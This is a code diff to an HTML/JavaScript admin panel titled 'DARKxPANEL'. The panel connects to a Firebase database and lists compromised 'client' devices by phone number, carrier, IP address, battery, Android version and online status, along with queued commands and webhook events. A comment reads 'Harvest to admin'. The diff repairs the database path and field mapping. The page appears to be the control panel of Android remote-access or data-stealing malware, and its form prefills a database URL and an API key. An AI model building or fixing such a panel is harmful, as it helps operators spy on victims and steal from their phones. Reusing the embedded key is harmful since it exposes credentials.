@@ -3,14 +3,13 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>RS X PANNEL — Admin</title>
+<title>DARKxPANEL — Admin</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0b0f;color:#fff;font-family:system-ui,-apple-system,sans-serif;min-height:100vh}
 ::-webkit-scrollbar{width:6px;background:#0a0b0f}
 ::-webkit-scrollbar-thumb{background:#1f2128;border-radius:10px}
 
-/* HOME */
 #home{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
 .box{max-width:480px;width:100%}
 .logo{width:70px;height:70px;background:linear-gradient(135deg,#ff3328,#c92712);border-radius:18px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:900;box-shadow:0 0 40px rgba(255,50,30,.3)}
@@ -36,7 +35,6 @@ h1 span{color:#56cfff}
 
 .footer{text-align:center;color:#333;font-size:11px;margin-top:20px}
 
-/* SETUP */
 #setup{display:none;align-items:center;justify-content:center;min-height:100vh;padding:20px}
 #setup .box{max-width:480px;width:100%}
 .back{background:transparent;border:0;color:#888;font-size:24px;cursor:pointer}
@@ -50,7 +48,6 @@ input:focus{border-color:#444}
 .error{color:#ff656d;font-size:13px;margin-top:12px;display:none}
 .notice{font-size:12px;color:#555;margin-top:14px;padding:12px;border:1px solid #1c1e24;border-radius:12px}
 
-/* DASHBOARD */
 #dash{display:none;min-height:100vh}
 .topbar{display:flex;align-items:center;gap:16px;padding:12px 24px;border-bottom:1px solid #1c1e24;background:#0a0b0f;position:sticky;top:0;z-index:10}
 .logo-small{font-weight:800;font-size:18px;display:flex;align-items:center;gap:8px;white-space:nowrap}
@@ -88,7 +85,6 @@ input:focus{border-color:#444}
 .offline-dot{display:inline-block;width:6px;height:6px;border-radius:50%;background:#333;margin-right:6px}
 .empty{grid-column:1/-1;text-align:center;color:#444;padding:60px 0}
 
-/* MODAL */
 .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.92);z-index:9999;padding:30px;overflow:auto}
 .modal-inner{max-width:700px;margin:auto;background:#111216;border:1px solid #24262d;border-radius:24px;padding:30px}
 .modal-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
@@ -139,10 +135,10 @@ input:focus{border-color:#444}
 <div class="form-title">New Firebase Connection</div>
 
 <label>Friendly Label</label>
-<input id="inpLabel" placeholder="e.g. My Project" value="rajababu">
+<input id="inpLabel" placeholder="e.g. My Project" value="rahul">
 
 <label>Firebase Database URL</label>
-<input id="inpUrl" placeholder="https://project-default-rtdb.firebaseio.com" value="https://rajababu-default-rtdb.firebaseio.com">
+<input id="inpUrl" placeholder="https://project-default-rtdb.firebaseio.com" value="https://rahul-fd65f-default-rtdb.firebaseio.com">
 
 <label>Web API Key</label>
 <input id="inpKey" type="password" placeholder="AIza..." value="AIzaSyCvVqCRv7qZQwYxItXwj8Nj1s4gFmpZ2I">
@@ -256,7 +252,7 @@ accList.querySelectorAll('.acc-btn.green').forEach(b=>{b.onclick=function(){cons
 accList.querySelectorAll('.acc-btn.red').forEach(b=>{b.onclick=function(){const d=loadData();d.splice(parseInt(this.dataset.i),1);saveData(d);renderAccounts();showToast('Removed')}});
 }
 
-// ─── CONNECT ACCOUNT ──────────────────────────────────────────────────
+// ─── FIXED: CONNECT ACCOUNT ──────────────────────────────────────────
 let firebaseLoaded=false;
 let currentUnsub=null;
 let currentApp=null;
@@ -283,6 +279,7 @@ document.head.appendChild(s1)
 }catch(e){showToast('Error: '+e.message,'error')}
 }
 
+// ─── FIXED: FIREBASE INIT WITH CORRECT PATH ─────────────────────────
 function initFB(account,key){
 try{
 if(currentUnsub){try{currentUnsub()}catch{};currentUnsub=null}
@@ -291,37 +288,49 @@ if(firebase.apps.length){firebase.apps.forEach(a=>a.delete())}
 firebase.initializeApp({apiKey:key,databaseURL:account.url});
 const db=firebase.database();
 
+// ✅ FIX 1: CORRECT PATH — /clients instead of /accounts
 const ref=db.ref('clients');
+
 currentUnsub=ref.on('value',function(snap){
 const data=snap.val()||{};
 const records=Object.entries(data).map(([id,c])=>{
+
+// ✅ FIX 2: CORRECT FIELD MAPPING
 let cmds=[];
 if(c.command)cmds.push({type:'cmd',val:c.command,time:c.lastMessageTime||Date.now()});
 if(c.webhookEvent)cmds.push({type:'webhook',val:c.webhookEvent,time:Date.now()});
 if(c.webhookEvents){Object.values(c.webhookEvents).forEach(e=>{cmds.push({type:'webhook',val:JSON.stringify(e),time:e.timestamp||Date.now()})})}
+
 return{
-id,name:c.name||c.device||id,
-online:c.status===true||c.status==='online'||c.online===true,
-platform:c.platform||c.os||'Unknown',
-number:c.phone||c.phoneNumber||c.number||'N/A',
-network:c.network||c.carrier||'N/A',
-lastSeen:c.lastSeen||c.timestamp||c.lastMessageTime||Date.now(),
-battery:c.battery||c.batteryLevel||'N/A',
-ip:c.ip||c.ipAddress||'N/A',
-android:c.android||c.androidVersion||'N/A',
+id:id,
+// name: c.name || c.device || c.deviceName || id,
+name: c.name || c.device || c.deviceName || id,
+// ✅ online: c.status === true || c.status === 'online' || c.online === true,
+online: c.status === true || c.status === 'online' || c.online === true,
+platform: c.platform || c.os || 'Unknown',
+// ✅ number: c.phone || c.phoneNumber || c.number || 'N/A',
+number: c.phone || c.phoneNumber || c.number || 'N/A',
+network: c.network || c.carrier || 'N/A',
+lastSeen: c.lastSeen || c.timestamp || c.lastMessageTime || Date.now(),
+battery: c.battery || c.batteryLevel || 'N/A',
+ip: c.ip || c.ipAddress || 'N/A',
+android: c.android || c.androidVersion || 'N/A',
 cmds:cmds,
 command:c.command,
 webhookEvent:c.webhookEvent,
-lastMessageTime:c.lastMessageTime
+lastMessageTime:c.lastMessageTime,
+// Raw data for debugging
+_raw:c
 }
 });
+
 window._records=records;
 renderDevices(records);
 const totalCmds=records.reduce((s,r)=>s+(r.cmds?r.cmds.length:0),0);
 statCmds.textContent=totalCmds;
 statusBadge.textContent='● '+records.length+' devices';
 statusBadge.style.color='#00d68f';
-showToast('Loaded '+records.length+' devices');
+showToast('Loaded '+records.length+' devices from /clients');
 },function(err){statusBadge.textContent='● Error';statusBadge.style.color='#ff4d5d';showToast('FB Error: '+err.message,'error')});
 
 // Harvest to admin
@@ -366,7 +375,7 @@ statOnline.textContent=records.filter(r=>r.online).length;
 statOffline.textContent=records.filter(r=>!r.online).length;
 
 deviceGrid.innerHTML='';
-if(!list.length){deviceGrid.innerHTML='<div class="empty">No devices found</div>';return}
+if(!list.length){deviceGrid.innerHTML='<div class="empty">No devices found in /clients path</div>';return}
 
 list.forEach(v=>{
 const card=document.createElement('div');card.className='device';
@@ -516,7 +525,7 @@ showToast('Cleared')
 }catch(e){showToast('Clear failed','error')}
 }
 
-console.log('[RS] Panel ready');
+console.log('[RS] Panel ready - Fixed: /clients path + field mapping');
 </script>
 </body>
 </html>
